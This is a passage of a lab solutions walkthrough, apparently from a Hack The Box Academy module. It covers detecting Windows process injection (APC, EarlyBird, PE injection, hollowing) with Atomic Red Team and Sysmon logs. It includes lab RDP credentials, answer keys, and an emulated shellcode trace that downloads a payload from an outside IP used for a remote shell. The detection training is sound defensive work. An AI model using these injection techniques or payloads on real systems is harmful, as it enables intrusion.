[03:04:55:910] [5028:5029] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[03:04:55:910] [5028:5029] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[03:04:55:910] [5028:5029] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[03:04:55:910] [5028:5029] [ERROR][com.freerdp.crypto] - The hostname used for this connection (10.129.229.26:3389) 
[03:04:55:911] [5028:5029] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
[03:04:55:911] [5028:5029] [ERROR][com.freerdp.crypto] - Common Name (CN):
[03:04:55:911] [5028:5029] [ERROR][com.freerdp.crypto] - 	Logging-VM
[03:04:55:911] [5028:5029] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
Certificate details for 10.129.229.26:3389 (RDP-Server):
	Common Name: Logging-VM
	Subject:     CN = Logging-VM
	Issuer:      CN = Logging-VM
	Thumbprint:  c4:b5:44:94:8f:b4:eb:e0:56:17:8d:4b:7c:e8:ae:7c:34:3a:61:8e:69:6a:7e:6e:62:27:0f:aa:14:f4:dc:5d
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
```

Students will open PowerShell, navigate to `C:\AtomicRedTeam\invoke-atomicredteam`, and import the `Invoke-AtomicRedTeam.psd1` module:

Code: powershell

```powershell
cd C:\AtomicRedTeam\invoke-atomicredteam
Import-Module .\Invoke-AtomicRedTeam.psd1
```

```
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\Administrator> cd C:\AtomicRedTeam\invoke-atomicredteam
PS C:\AtomicRedTeam\invoke-atomicredteam> Import-Module .\Invoke-AtomicRedTeam.psd1
```

Next, students will initiate the `T1055.004-3` test using the `Invoke-AtomicTest` command:

Code: powershell

```powershell
Invoke-AtomicTest T1055.004-3
```

```
PS C:\AtomicRedTeam\invoke-atomicredteam> Invoke-AtomicTest T1055.004-3
PathToAtomicsFolder = C:\AtomicRedTeam\atomics

Executing test: T1055.004-3 Remote Process Injection with Go using NtQueueApcThreadEx WinAPI
[DEBUG]Loading kernel32.dll and ntdll.dll...
[DEBUG]Loading VirtualAlloc, VirtualProtect, and RtlCopyMemory procedures...
[DEBUG]Calling VirtualAlloc for shellcode...
[DEBUG]Copying shellcode to memory with RtlCopyMemory...
[DEBUG]Calling VirtualProtect to change memory region to PAGE_EXECUTE_READ...
[DEBUG]Calling GetCurrentThread...
[DEBUG]Calling NtQueueApcThreadEx...
Exit code: 0
Done executing test: T1055.004-3 Remote Process Injection with Go using NtQueueApcThreadEx WinAPI
```

Students will notice the debug messages, which provide some insights about the functions used to create the calculator process. Next, they will open Event Viewer and navigate to the Sysmon logs: `Application and Services` > `Microsoft` > `Windows` > `Sysmon` > `Operational`. Students will use the `Filter Current Log...` feature to filter for `Sysmon Event ID 1` (`Process Create`) events and subsequently use the `Find` feature to look for `calc.exe`:

![[HTB Solutions/Others/z. images/772fd2e548cf17e19a4fa33e7e8fcf57_MD5.jpg]]

![[HTB Solutions/Others/z. images/7b46d6843499b11abbf9f44909456d8c_MD5.jpg]]

Students will scrutinize the logs and stumble upon an event related to spawning the calculator (`calc.exe`) using an executable related to `QueueApcThread` (`QueueUserAPC`) and take note of the `ProcessId` value (`5124`):

![[HTB Solutions/Others/z. images/0dd75ff1377f34432d027701dcf53632_MD5.jpg]]

Students will redefine the search string to look for events related to the process id found earlier (`5124`) and stumble upon an event, where the `calc.exe` process spawned another process (child process) and find the name of the process:

![[HTB Solutions/Others/z. images/daccc031858efff4e2296880985c00df_MD5.jpg]]

![[HTB Solutions/Others/z. images/3c617134a7ffcad355f09fbb341776f4_MD5.jpg]]

Answer: `win32calc.exe`

# APC - Detection Opportunities

## Question 1

### "Simulate the EarlyBird APC Queue injection-related Atomic test number T1055.004-2 in PowerShell. Check the Sealighgter-TI event logs after the simulation. What is the value of TargetThreadAlertable in the detected KERNEL\_THREATINT\_TASK\_QUEUEUSERAPC event?"

After spawning the target machine, students will establish an RDP session using the credentials `Administrator:P3n#31337@LOG`:

Code: shell

```shell
xfreerdp /v:STMIP /u:Administrator /p:'P3n#31337@LOG' /dynamic-resolution
```

```
┌─[eu-academy-5]─[10.10.14.72]─[htb-ac-8414@htb-gat2h1clfv]─[~]
└──╼ [★]$ xfreerdp /v:10.129.132.114 /u:Administrator /p:'P3n#31337@LOG' /dynamic-resolution

[03:39:31:700] [60654:60655] [WARN][com.freerdp.crypto] - Certificate verification failure 'self-signed certificate (18)' at stack position 0
[03:39:31:700] [60654:60655] [WARN][com.freerdp.crypto] - CN = Logging-VM
[03:39:31:701] [60654:60655] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[03:39:31:701] [60654:60655] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[03:39:31:701] [60654:60655] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[03:39:31:701] [60654:60655] [ERROR][com.freerdp.crypto] - The hostname used for this connection (10.129.132.114:3389) 
[03:39:31:701] [60654:60655] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
[03:39:31:701] [60654:60655] [ERROR][com.freerdp.crypto] - Common Name (CN):
[03:39:31:701] [60654:60655] [ERROR][com.freerdp.crypto] - 	Logging-VM
[03:39:31:701] [60654:60655] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
Certificate details for 10.129.132.114:3389 (RDP-Server):
	Common Name: Logging-VM
	Subject:     CN = Logging-VM
	Issuer:      CN = Logging-VM
	Thumbprint:  c4:b5:44:94:8f:b4:eb:e0:56:17:8d:4b:7c:e8:ae:7c:34:3a:61:8e:69:6a:7e:6e:62:27:0f:aa:14:f4:dc:5d
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
```

Students will open PowerShell, navigate to `C:\AtomicRedTeam\invoke-atomicredteam`, and import the `Invoke-AtomicRedTeam.psd1` module:

Code: powershell

```powershell
cd C:\AtomicRedTeam\invoke-atomicredteam
Import-Module .\Invoke-AtomicRedTeam.psd1
```

```
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\Administrator> cd C:\AtomicRedTeam\invoke-atomicredteam
PS C:\AtomicRedTeam\invoke-atomicredteam> Import-Module .\Invoke-AtomicRedTeam.psd1
```

Next, students will initiate the `T1055.004-2` test using the `Invoke-AtomicTest` command:

Code: powershell

```powershell
Invoke-AtomicTest T1055.004-2
```

```
PS C:\AtomicRedTeam\invoke-atomicredteam> Invoke-AtomicTest T1055.004-2
PathToAtomicsFolder = C:\AtomicRedTeam\atomics

Executing test: T1055.004-2 EarlyBird APC Queue Injection in Go
[DEBUG]Loading kernel32.dll and ntdll.dll...
[DEBUG]Loading supporting procedures...
[DEBUG]Calling CreateProcess to start:
        C:\Windows\System32\werfault.exe ...
[DEBUG]Calling VirtualAllocEx on PID 1528...
[DEBUG]Shellcode address: 0x22266f70000
[DEBUG]Calling WriteProcessMemory on PID 1528...
[DEBUG]Calling VirtualProtectEx on PID 1528...
[DEBUG]Calling QueueUserAPC
[DEBUG]The QueueUserAPC call returned 1
[DEBUG]Calling ResumeThread...
[DEBUG]Calling CloseHandle on child process...
[DEBUG]Calling CloseHandle on child process thread...
Exit code: 0
Done executing test: T1055.004-2 EarlyBird APC Queue Injection in Go
```

Students will open Event Viewer and navigate to `Application and Services Logs` > `Sealighter` > `Operational` and are going to use the `Find` feature to look for an event related to the task name `KERNEL_THREATINT_TASK_QUEUEUSERAPC`, where they will find the value of `TargetThreadAlertable`:

![[HTB Solutions/Others/z. images/0417b2d88a0a3585bb9ef0bca39506e5_MD5.jpg]]

![[HTB Solutions/Others/z. images/63f90dadeffc62164b235444b86e7ef5_MD5.jpg]]

Answer: `0`

# Debugging TLS Callback

## Question 1

### "Open the tls\_callback.exe sample in CFF Explorer, and go to the TLS Directory to check the AddressOfCallBacks address. Now, go to CFF Explorer's Address Converter and type this address in the VA textbox. Check the ASCII strings present at offset 1490. Enter the first 10 characters (0-9) of the ASCII strings present at offset 1490."

After spawning the target machine, students will establish an RDP session using the credentials `Administrator:P3n#31337@LOG`:

Code: shell

```shell
xfreerdp /v:STMIP /u:Administrator /p:'P3n#31337@LOG' /dynamic-resolution
```

```
┌─[eu-academy-5]─[10.10.14.72]─[htb-ac-8414@htb-gat2h1clfv]─[~]
└──╼ [★]$ xfreerdp /v:10.129.151.217 /u:Administrator /p:'P3n#31337@LOG' /dynamic-resolution

[04:20:53:513] [125426:125427] [WARN][com.freerdp.crypto] - Certificate verification failure 'self-signed certificate (18)' at stack position 0
[04:20:53:513] [125426:125427] [WARN][com.freerdp.crypto] - CN = Logging-VM
[04:20:53:514] [125426:125427] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[04:20:53:514] [125426:125427] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[04:20:53:514] [125426:125427] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[04:20:53:514] [125426:125427] [ERROR][com.freerdp.crypto] - The hostname used for this connection (10.129.151.217:3389) 
[04:20:53:514] [125426:125427] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
[04:20:53:514] [125426:125427] [ERROR][com.freerdp.crypto] - Common Name (CN):
[04:20:53:514] [125426:125427] [ERROR][com.freerdp.crypto] - 	Logging-VM
[04:20:53:514] [125426:125427] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
Certificate details for 10.129.151.217:3389 (RDP-Server):
	Common Name: Logging-VM
	Subject:     CN = Logging-VM
	Issuer:      CN = Logging-VM
	Thumbprint:  c4:b5:44:94:8f:b4:eb:e0:56:17:8d:4b:7c:e8:ae:7c:34:3a:61:8e:69:6a:7e:6e:62:27:0f:aa:14:f4:dc:5d
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
```

Students will open `CFF Explorer.exe` located on the desktop and will open `tls_callback.exe` located in the `C:\injection\tls_callback` directory by clicking `File` > `Open`:

![[HTB Solutions/Others/z. images/7c196d11f3dff0cda495b131eea95386_MD5.jpg]]

Students will navigate to `TLS Directory` and double-click and copy the value (address) of `AddressOfCallBacks`:

![[HTB Solutions/Others/z. images/706ef1edf14ad5024c0d17423765ae3c_MD5.jpg]]

Next, they will go to `Address Converter` and paste the previously copied value in the `VA` parameter to find ASCII characters in the 1490 offset:

![[HTB Solutions/Others/z. images/c97a10aa64ff3d3615d0b3ad20399744_MD5.jpg]]

Answer: `HackTheBox`

# Section View Mapping - Implementation

## Question 1

### "Run the file "C:\\injection\\exercises\\mapview\_inject.bat" and check the event logs to find the child process that is executed by the shellcode. Answer format is \*\*\*\*\*\*\*2.exe"

After spawning the target machine, students will establish an RDP session using the credentials `Administrator:P3n#31337@LOG`:

Code: shell

```shell
xfreerdp /v:STMIP /u:Administrator /p:'P3n#31337@LOG' /dynamic-resolution
```

```
┌─[eu-academy-5]─[10.10.14.72]─[htb-ac-8414@htb-qrvdq5eqqy]─[~]
└──╼ [★]$ xfreerdp /v:10.129.32.247 /u:Administrator /p:'P3n#31337@LOG' /dynamic-resolution

[06:08:52:843] [26220:26221] [WARN][com.freerdp.crypto] - Certificate verification failure 'self-signed certificate (18)' at stack position 0
[06:08:52:843] [26220:26221] [WARN][com.freerdp.crypto] - CN = Logging-VM
[06:08:52:844] [26220:26221] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[06:08:52:844] [26220:26221] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[06:08:52:844] [26220:26221] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[06:08:52:844] [26220:26221] [ERROR][com.freerdp.crypto] - The hostname used for this connection (10.129.32.247:3389) 
[06:08:52:844] [26220:26221] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
[06:08:52:844] [26220:26221] [ERROR][com.freerdp.crypto] - Common Name (CN):
[06:08:52:844] [26220:26221] [ERROR][com.freerdp.crypto] - 	Logging-VM
[06:08:52:844] [26220:26221] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
Certificate details for 10.129.32.247:3389 (RDP-Server):
	Common Name: Logging-VM
	Subject:     CN = Logging-VM
	Issuer:      CN = Logging-VM
	Thumbprint:  c4:b5:44:94:8f:b4:eb:e0:56:17:8d:4b:7c:e8:ae:7c:34:3a:61:8e:69:6a:7e:6e:62:27:0f:aa:14:f4:dc:5d
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
```

Students will open PowerShell and run `mapview_inject.bat` located in the `C:\injection\exercises\` directory:

Code: powershell

```powershell
C:\injection\exercises\mapview_inject.bat
```

```
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\Administrator> C:\injection\exercises\mapview_inject.bat
```

Next, students will open Event Viewer and navigate to the Sysmon logs: `Application and Services` > `Microsoft` > `Windows` > `Sysmon` > `Operational`. Students will use the `Find` feature to search for the `mapview_inject.bat` string, where they will find the spawned process (`mapview_inject.exe`) and find the name of the remote process while taking note of the process id (`5872`):

![[HTB Solutions/Others/z. images/bdcbb148a88df5d741198caa247cf73b_MD5.jpg]]

![[HTB Solutions/Others/z. images/67244faddcbef8ced2644eb393601251_MD5.jpg]]

Students will apply a filter to look for `Sysmon Event ID 8` (`CreateRemoteThread`) because the `RtlCreateUserThread` functional call is present in the section's source code and indicates shellcode injection within the new thread.

![[HTB Solutions/Others/z. images/fc791e4fe1364833f7ee3af768efd096_MD5.jpg]]

In the most recent log, students will find the injection's target process (`notepad.exe`) and note the `TargetProcessId` value (`5168`). Additionally, students can use the `Find` feature to look for events related to the `5872` process id.

![[HTB Solutions/Others/z. images/cb9b9b1a24203111fe8165e185bc9af5_MD5.jpg]]

Next, they will adjust the filter to look for `Sysmon Event ID 1` (`Process Create`) logs and use the `Find` feature to find an event originating from the new process id (`5168`) found earlier:

![[HTB Solutions/Others/z. images/70197e0e757d4f7e4f2e77171e80f85f_MD5.jpg]]

![[HTB Solutions/Others/z. images/d16a84d952aa2ebb191f9a2d8761d51b_MD5.jpg]]

Upon scrutinizing the logs, students will find an event related to the child process executed by the shellcode and its filename:

![[HTB Solutions/Others/z. images/17f83789b4707f6b6e0c1180545cb0e8_MD5.jpg]]

Answer: `wowreg32.exe`

# Detection Opportunities

## Question 1

### "Execute the file "C:\\injection\\exercises\\mapview\_shellcode.bat". Perform some shellcode debugging to figure out the IP address used for the remote shell. Type the IP address as your answer."

After spawning the target machine, students will establish an RDP session using the credentials `Administrator:P3n#31337@LOG`:

Code: shell

```shell
xfreerdp /v:STMIP /u:Administrator /p:'P3n#31337@LOG' /dynamic-resolution
```

```
┌─[eu-academy-5]─[10.10.14.95]─[htb-ac-8414@htb-pcayqmchbt]─[~]
└──╼ [★]$ xfreerdp /v:10.129.48.71 /u:Administrator /p:'P3n#31337@LOG' /dynamic-resolution

[06:07:27:844] [13874:13875] [WARN][com.freerdp.crypto] - Certificate verification failure 'self-signed certificate (18)' at stack position 0
[06:07:27:844] [13874:13875] [WARN][com.freerdp.crypto] - CN = Logging-VM
[06:07:27:844] [13874:13875] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[06:07:27:844] [13874:13875] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[06:07:27:844] [13874:13875] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[06:07:27:844] [13874:13875] [ERROR][com.freerdp.crypto] - The hostname used for this connection (10.129.48.71:3389) 
[06:07:27:844] [13874:13875] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
[06:07:27:844] [13874:13875] [ERROR][com.freerdp.crypto] - Common Name (CN):
[06:07:27:844] [13874:13875] [ERROR][com.freerdp.crypto] - 	Logging-VM
[06:07:27:844] [13874:13875] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
Certificate details for 10.129.48.71:3389 (RDP-Server):
	Common Name: Logging-VM
	Subject:     CN = Logging-VM
	Issuer:      CN = Logging-VM
	Thumbprint:  c4:b5:44:94:8f:b4:eb:e0:56:17:8d:4b:7c:e8:ae:7c:34:3a:61:8e:69:6a:7e:6e:62:27:0f:aa:14:f4:dc:5d
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
```

Students will open Command Prompt and execute the `mapview_shellcode.bat` file located in the `C:\injection\exercises` directory:

Code: cmd

```cmd
C:\injection\exercises\mapview_shellcode.bat
```

```
Microsoft Windows [Version 10.0.17763.2628]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\Administrator>C:\injection\exercises\mapview_shellcode.bat
```

Subsequently, students will open `Process Hacker` located in the taskbar, locate the `mapview_shellcode.exe` process, right-click, and click on `Properties`:

![[HTB Solutions/Others/z. images/71aec40503f1b357ecbeaf58d61e476d_MD5.jpg]]

Students will refer to the knowledge obtained from the previous section (`Section View Mapping - Implementation`) to locate the mapped section by going to the `Handles` tab, locating the `Section` type commit, right-click on it, and click on `Read/Write memory`:

![[HTB Solutions/Others/z. images/6c927b2bc89348cfd1b90e77f62d4d18_MD5.jpg]]

Subsequently, students will save the memory using the `Save...` button on the Desktop:

![[HTB Solutions/Others/z. images/89a2dea2efebf4922ccced8bb7004d58_MD5.jpg]]

Students will return to the previously spawned Command Prompt terminal, navigate to the `Desktop`, and use `speakeasy` to analyze the save shellcode to find the IP address within the `InternetConnectA` function of the `wininet` library:

Code: cmd

```cmd
cd Desktop\
speakeasy -t Memory.bin -r -a x64
```

```
C:\Users\Administrator\Desktop>speakeasy -t Memory.bin -r -a x64

* exec: shellcode
0x10f3: 'kernel32.LoadLibraryA("wininet")' -> 0x7bc00000
0x1188: 'wininet.InternetOpenA("Mozilla/5.0 (Macintosh; Intel Mac OS X 14_7_2) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15", 0x0, 0x0, 0x0, 0x0)' -> 0x20
0x11bb: 'wininet.InternetConnectA(0x20, "{hidden}", 0x1f90, 0x0, 0x0, 0x3, 0x0, 0x0)' -> 0x24
0x1295: 'wininet.HttpOpenRequestA(0x24, 0x0, "/ZNCy-j8d27T59fj3nlq0-QG2BhwDhaKb7CB3tjFJd5x-2XVtAUC8w9Tw-O19L1dYQS88XUeU-7N_Skq9ew_QUAttP-3zd_bN9xtiubRDNvZUEQ0d0-i5dZ5OSdY8m1-TLtGKwuuQwF0fuV-WuiE7UQ9b33RTxrXBS7ah_hFcHCDUzB4siT", 0x0, 0x0, 0x0, "INTERNET_FLAG_DONT_CACHE | INTERNET_FLAG_NO_AUTO_REDIRECT | INTERNET_FLAG_NO_COOKIES | INTERNET_FLAG_NO_UI | INTERNET_FLAG_RELOAD", 0x0)' -> 0x28
0x12b1: 'wininet.HttpSendRequestA(0x28, 0x0, 0x11c0, 0x0, 0x0)' -> 0x1
0x12f2: 'kernel32.VirtualAlloc(0x0, 0x400000, 0x1000, "PAGE_EXECUTE_READWRITE")' -> 0x450000
0x1315: 'wininet.InternetReadFile(0x28, 0x450000, 0x2000, 0x1203e60)' -> 0x1
0x1315: 'wininet.InternetReadFile(0x28, 0x451000, 0x2000, 0x1203e60)' -> 0x1
0x450012: Unhandled interrupt: intnum=0x3
0x450012: shellcode: Caught error: unhandled_interrupt
* Finished emulating
```

Answer: `185.220.101.70`

# PE Injection - Implementation

## Question 1

### "Run the Portable Executable Injection related Atomic test number T1055.002-1 in PowerShell. Check the Sysmon event logs after the simulation. In your answer, type the full path of the ParentImage used to perform this attack."

After spawning the target machine, students will establish an RDP session using the credentials `Administrator:P3n#31337@LOG`:

Code: shell

```shell
xfreerdp /v:STMIP /u:Administrator /p:'P3n#31337@LOG' /dynamic-resolution
```

```
┌─[eu-academy-5]─[10.10.14.72]─[htb-ac-8414@htb-v4rueouyik]─[~]
└──╼ [★]$ xfreerdp /v:10.129.146.158 /u:Administrator /p:'P3n#31337@LOG' /dynamic-resolution 

[02:39:28:819] [142824:142825] [WARN][com.freerdp.crypto] - Certificate verification failure 'self-signed certificate (18)' at stack position 0
[02:39:28:819] [142824:142825] [WARN][com.freerdp.crypto] - CN = Logging-VM
[02:39:28:819] [142824:142825] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[02:39:28:819] [142824:142825] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[02:39:28:819] [142824:142825] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[02:39:28:819] [142824:142825] [ERROR][com.freerdp.crypto] - The hostname used for this connection (10.129.146.158:3389) 
[02:39:28:819] [142824:142825] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
[02:39:28:819] [142824:142825] [ERROR][com.freerdp.crypto] - Common Name (CN):
[02:39:28:819] [142824:142825] [ERROR][com.freerdp.crypto] - 	Logging-VM
[02:39:28:819] [142824:142825] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
Certificate details for 10.129.146.158:3389 (RDP-Server):
	Common Name: Logging-VM
	Subject:     CN = Logging-VM
	Issuer:      CN = Logging-VM
	Thumbprint:  c4:b5:44:94:8f:b4:eb:e0:56:17:8d:4b:7c:e8:ae:7c:34:3a:61:8e:69:6a:7e:6e:62:27:0f:aa:14:f4:dc:5d
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
```

Students will open PowerShell, navigate to `C:\AtomicRedTeam\invoke-atomicredteam`, and import the `Invoke-AtomicRedTeam.psd1` module:

Code: powershell

```powershell
cd C:\AtomicRedTeam\invoke-atomicredteam
Import-Module .\Invoke-AtomicRedTeam.psd1
```

```
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\Administrator> cd C:\AtomicRedTeam\invoke-atomicredteam
PS C:\AtomicRedTeam\invoke-atomicredteam> Import-Module .\Invoke-AtomicRedTeam.psd1
```

Next, students will initiate the `T1055.002-1` test using the `Invoke-AtomicTest` command:

Code: powershell

```powershell
Invoke-AtomicTest T1055.002-1
```

```
PS C:\AtomicRedTeam\invoke-atomicredteam> Invoke-AtomicTest T1055.002-1

PathToAtomicsFolder = C:\AtomicRedTeam\atomics

Executing test: T1055.002-1 Portable Executable Injection
Exit code: 0
Done executing test: T1055.002-1 Portable Executable Injection
```

Students will open Event Viewer and navigate to the Sysmon logs: `Application and Services` > `Microsoft` > `Windows` > `Sysmon` > `Operational`. They will use the `Filter Current Log...` feature to look for `Sysmon Event ID 1` (`Process Create`) and subsequently utilize the `Find` feature to look for the `Atomic` string:

![[HTB Solutions/Others/z. images/a05c3524b3c5fb68106dffc799795592_MD5.jpg]]

![[HTB Solutions/Others/z. images/b756b2c3e99cda77506cdf4dc375d2e8_MD5.jpg]]

Students will examine the logs and find an event where the notepad.exe process was spawned. They will find the path and process name in the `ParentImage` parameter.

![[HTB Solutions/Others/z. images/60eef0b37227a2f02d4033e168489040_MD5.jpg]]

Answer: `C:\AtomicRedTeam\atomics\T1055.002\bin\RedInjection.exe`

# Demo and Detections

## Question 1

### "Invoke the AtomicTest number T1055.012-4 (Process Hollowing in Go using CreateProcessW and CreatePipe WinAPIs). In the event logs, find out the name of the process started by PowerShell to simulate this technique. Answer format is \*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*e.exe"

After spawning the target machine, students will establish an RDP session using the credentials `Administrator:P3n#31337@LOG`:

Code: shell

```shell
xfreerdp /v:STMIP /u:Administrator /p:'P3n#31337@LOG' /dynamic-resolution
```

```
┌─[eu-academy-5]─[10.10.14.72]─[htb-ac-8414@htb-v4rueouyik]─[~]
└──╼ [★]$ xfreerdp /v:10.129.45.166 /u:Administrator /p:'P3n#31337@LOG' /dynamic-resolution 

[03:06:53:455] [185853:185854] [WARN][com.freerdp.crypto] - Certificate verification failure 'self-signed certificate (18)' at stack position 0
[03:06:53:455] [185853:185854] [WARN][com.freerdp.crypto] - CN = Logging-VM
[03:06:53:456] [185853:185854] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[03:06:53:456] [185853:185854] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[03:06:53:456] [185853:185854] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[03:06:53:456] [185853:185854] [ERROR][com.freerdp.crypto] - The hostname used for this connection (10.129.45.166:3389) 
[03:06:53:456] [185853:185854] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
[03:06:53:456] [185853:185854] [ERROR][com.freerdp.crypto] - Common Name (CN):
[03:06:53:456] [185853:185854] [ERROR][com.freerdp.crypto] - 	Logging-VM
[03:06:53:456] [185853:185854] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
Certificate details for 10.129.45.166:3389 (RDP-Server):
	Common Name: Logging-VM
	Subject:     CN = Logging-VM
	Issuer:      CN = Logging-VM
	Thumbprint:  c4:b5:44:94:8f:b4:eb:e0:56:17:8d:4b:7c:e8:ae:7c:34:3a:61:8e:69:6a:7e:6e:62:27:0f:aa:14:f4:dc:5d
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
```

Students will open PowerShell, navigate to `C:\AtomicRedTeam\invoke-atomicredteam`, and import the `Invoke-AtomicRedTeam.psd1` module:

Code: powershell

```powershell
cd C:\AtomicRedTeam\invoke-atomicredteam
Import-Module .\Invoke-AtomicRedTeam.psd1
```

```
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\Administrator> cd C:\AtomicRedTeam\invoke-atomicredteam
PS C:\AtomicRedTeam\invoke-atomicredteam> Import-Module .\Invoke-AtomicRedTeam.psd1
```

Next, students will initiate the `T1055.012-4` test using the `Invoke-AtomicTest` command:

Code: powershell

```powershell
Invoke-AtomicTest T1055.012-4
```

```
PS C:\AtomicRedTeam\invoke-atomicredteam> Invoke-AtomicTest T1055.012-4

PathToAtomicsFolder = C:\AtomicRedTeam\atomics

Executing test: T1055.012-4 Process Hollowing in Go using CreateProcessW and CreatePipe WinAPIs (T1055.012)
[DEBUG]Loading kernel32.dll and ntdll.dll...
[DEBUG]Loading supporting procedures...
[DEBUG]Calling CreatePipe for STDIN...
[DEBUG]STDIN pipe read handle 348
[DEBUG]STDIN pipe write handle 352
[DEBUG]Calling CreatePipe for STDOUT...
[DEBUG]STDOUT pipe read handle 356
[DEBUG]STDOUT pipe write handle 360
[DEBUG]Calling CreatePipe for STDERR...
[DEBUG]STDERR pipe read handle 364
[DEBUG]STDOUT pipe write handle 368

<SNIP>
```

Students will open Event Viewer and navigate to the Sysmon logs: `Application and Services` > `Microsoft` > `Windows` > `Sysmon` > `Operational`. They will use the `Filter Current Log...` feature to look for `Sysmon Event ID 1` (`Process Create`) and subsequently utilize the `Find` feature to look for the `powershell.exe` string:

![[HTB Solutions/Others/z. images/d5df98773dd61e8e185e7c860ef9ba60_MD5.jpg]]

![[HTB Solutions/Others/z. images/cdb72dd81670870f38ed4e4c50972aa7_MD5.jpg]]

Students will examine the logs and find an event where `powershell.exe` was used to spawn another executable within the `ParentCommandLine` (`CommandLine` or `Image`) parameter:

![[HTB Solutions/Others/z. images/e92a03c25cc7f5752bcc5d22c991e3c4_MD5.jpg]]

Answer: `CreateProcessWithPipe.exe`

# RDLL Injection - Implementation

## Question 1

### "Explore the reflective\_dll.x64.dll file in CFF Explorer. What is the Relative Virtual Address (RVA) of the function containing the string ReflectiveLoader? Answer format is 0000\*\*\*\*"

After spawning the target machine, students will establish an RDP session using the credentials `Administrator:P3n#31337@LOG`:

Code: shell

```shell
